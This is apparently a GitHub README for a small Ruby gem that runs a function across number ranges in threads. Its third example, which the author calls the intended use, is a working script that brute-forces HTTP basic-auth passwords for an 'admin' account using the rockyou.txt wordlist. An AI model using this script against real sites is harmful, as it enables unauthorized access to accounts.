# ruby-gems
Ruby Gems
Repo of Gems I have built to host locally for installs.
if you see bugs pls let me know.


## Itorator


### Install
```
wget "https://github.com/rschwass/ruby-gems/raw/master/iterator-0.0.0.gem"
gem install iterator-0.0.0.gem
```

### Usage
Takes 4 parameters, start number, end number, thread number, "function name".
In the blow example (0, 100, 5, "attack")

#### Example 1
I am saying start at 0, end at 100, using 5 threads execute the "attack" function. The class returns the current number (as a string class)to the function.

```
require 'iterator'

def attack(number)
  puts "number"
end

Iterator.new.begin(0, 100, 5, "attack")
```

#### Example 2
In this example we can read a file line by line, but by specifying the line at each read, we can use a multi-threaded approach.
Im passing the total number of lines in the file as the second parameter. This  gives the iterator class what it needs to iterate over the file line by line passing those line numbers to the threads in correct sequence. As those line numbers come back to the "example2" method, I change the return value to an integer and use it to take that line number out of the file.
```
require 'rio'
require 'iterator'

$work_file = '/opt/wordlists/rockyou.txt'
line_total = File.foreach($work_file).count


def example2(x)
  x=x.to_i
  puts (rio($work_file).lines[x..x].join.strip())
end


Iterator.new.begin(0, line_total, 5, "example2")
```
#### Example 3
This very basic example is where it all comes together, in the way I utilize the gem as intended.
I iterate over a file and use it to brute force basic authentication on a website. building on example 2, 
I take the returned line number, get that line from my file and use it as a password in the http request.


```
require 'rio'
require 'iterator'
require 'net/http'
require 'uri'

$work_file = '/opt/wordlists/rockyou.txt'
line_total = File.foreach($work_file).count 


def example3(x)
  x=x.to_i
  password=(rio($work_file).lines[x..x].join.strip())

  uri = URI.parse("http://somesite.com")
  request = Net::HTTP::Get.new(uri)
  request.basic_auth("admin", "#{password}")

  req_options = {
    use_ssl: uri.scheme == "https",
  }

  response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
    http.request(request)
  end

  puts response.code
  # response.body
end

Iterator.new.begin(0, line_total, 5, "example3")
```
